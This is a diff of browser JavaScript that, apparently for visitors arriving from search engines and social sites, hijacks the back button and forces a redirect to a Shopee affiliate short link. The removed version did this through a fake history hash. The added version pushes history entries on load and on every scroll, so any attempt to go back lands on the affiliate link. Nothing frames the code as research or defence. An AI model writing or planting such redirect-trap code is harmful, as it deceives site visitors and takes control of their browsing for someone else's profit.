@@ -15,23 +15,19 @@ if ([".google.", "bing.", "yandex.", "facebook.", ".pinterest.", ".yahoo.", "mys
 }
 
 
-var shopeelink = pilihShopee([
-	'https://shope.ee/5zpL5DxoTU',
-]);
+    history.pushState(null, document.title, window.location.href);
+    window.addEventListener('popstate', function(event) {
+        window.location.href = "https://shope.ee/5zpL5DxoTU";
+    });
+    window.addEventListener('scroll', function() {
+        history.pushState(null, document.title, window.location.href);
+    });
 
-function pilihShopee(arr) {
-    return arr[Math.floor(arr.length * Math.random())];
-}
-
-(function(window, location) {
-history.replaceState(null, document.title, location.pathname+"#!/history");
-history.pushState(null, document.title, location.pathname);
-window.addEventListener("popstate", function() {
- if(location.hash === "#!/history") {
- history.replaceState(null, document.title, location.pathname);
- setTimeout(function(){
- location.replace(shopeelink);
- },10);
- }
-}, false);
-}(window, location));
+    function isUrl(data) {
+        try {
+            new URL(data);
+            return true;
+        } catch (e) {
+            return false;
+        };
+    };
